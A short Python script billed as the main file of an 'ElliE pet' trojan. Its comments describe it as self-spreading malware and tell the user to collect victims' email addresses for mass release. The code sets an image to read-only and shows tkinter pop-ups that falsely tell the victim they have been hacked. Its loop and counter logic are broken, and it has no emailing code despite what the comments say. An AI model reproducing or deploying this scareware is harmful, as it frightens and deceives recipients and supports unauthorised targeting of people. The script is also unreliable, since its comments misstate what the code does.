#!/usr/bin/ert

#This is the main sript of the "ElliE pet" trojian, the script once veiwed downloads its self and makes the image its self unable to be deleted. To Release on large scale, collect target email address and add to 'TargetEmails.txt'.

#This project also only targets windows (because we use edge to send the email) as its the largest demograpghic (to change the target or make it work on anything simply change the short cuts and browser)

#DISCLAIMER this script is meant for educational use and although it may not alter the hosts files it is STILL malware and should only be used with permision of the target
 
import os
import time
from tkinter import *
from tkinter import messagebox
from stat import S_IREAD, S_IRGRP, S_IROTH


#varable Declerations
MsgCounter = 0
###############################
image = 'ElliE.jpg'           #
##change this for a new image##

#sets file to be read-only
os.chmod(image, S_IREAD|S_IRGRP|S_IROTH)


root = Tk()
root.geometry("600x300")

w = Label(root, text ='.EXE', font = "50") 
w.pack()

time.sleep(0.5)

while MsgCounter > 6:
    messagebox.showerror("Image warning system", "Warning")
    MsgCounter + 1

if MsgCounter == 6:
    messagebox.showwarning("HACKED???", "YOU HAVE BEEN HACKED BY.You saw an image a few seconds ago, that image can no longer be deleted.")
    
    time.sleep(10)

   #change ".EXE" to your alias
    messagebox.showwarning("credit", ".EXE hacked you")

